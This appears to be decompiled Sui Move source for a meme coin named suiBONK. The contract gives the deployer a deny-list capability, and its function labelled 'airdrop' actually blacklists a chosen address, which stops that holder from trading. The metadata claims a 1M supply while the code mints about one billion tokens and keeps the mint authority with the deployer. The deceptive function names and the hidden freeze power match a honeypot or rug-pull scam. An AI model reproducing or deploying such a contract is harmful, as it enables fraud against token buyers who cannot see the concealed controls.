module 0x312ef2853edd60f1e65b7b9bd85aa33dfe6aa74f5692fabd898d8e282a9497d6::suibonk {
    struct SUIBONK has drop {
        dummy_field: bool,
    }

    public fun airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIBONK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SUIBONK>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SUIBONK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SUIBONK>(arg0, 9, b"suiBONK", b"suiBONK", b"suiBONK | 1M Supply | Tradable on Hop.Ag, Cetus & BlueMove", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://s3.coinmarketcap.com/static-gravity/image/a28128d9ff7c49c9ad33ee2f626fda40.png")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SUIBONK>>(v2);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SUIBONK>>(v1, 0x2::tx_context::sender(arg1));
        0x2::coin::mint_and_transfer<SUIBONK>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SUIBONK>>(v3, 0x2::tx_context::sender(arg1));
    }

    public fun no_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SUIBONK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SUIBONK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

